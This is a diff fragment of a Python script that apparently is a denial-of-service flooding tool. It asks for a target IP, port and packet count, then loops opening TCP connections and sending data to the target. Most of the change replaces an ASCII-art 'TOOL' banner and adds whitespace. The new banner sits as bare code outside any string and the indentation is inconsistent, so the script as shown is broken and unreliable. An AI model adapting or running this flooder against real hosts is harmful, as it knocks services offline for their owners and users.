@@ -14,19 +14,20 @@ import socket
 import os
 import time
 from termcolor import colored
+'||'''|.              \\      // '||` 
+ ||   ||               \\    //   ||  
+ ||   || .|''|, (''''   \\  //    ||  
+ ||   || ||  ||  `'')    \\//     ||  
+.||...|' `|..|' `...'     \/     .||. 
 
-         ___                           ____  ##
-          \   \						/    /   ##
-            \   \					/    /     ##
-              \   \				/    /       ##
-                \   \ 		   /    /         ##
-                  \   \        /    /           ##
-                    \   \    /    /             ##
-                      \   \/    /               ##
-                        \____/                ##########
-                                 
-                                  TOOL
-   				
+ 
+
+
+
+                    TOOL
+   		
+	
+		
 ip = str(input(colored("[+] IP: ", 'green')))
 port = int(input(colored("[+] Port: ", 'green')))
 packet = int(input(colored("[+] Packets: ", 'green')))
@@ -39,6 +40,10 @@ def syn():
    bb = int(0)
       while True:
       	try:
+		
+		
+		
+		
       	      h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 h.connect((ip,port))
                 h.send(hevin)
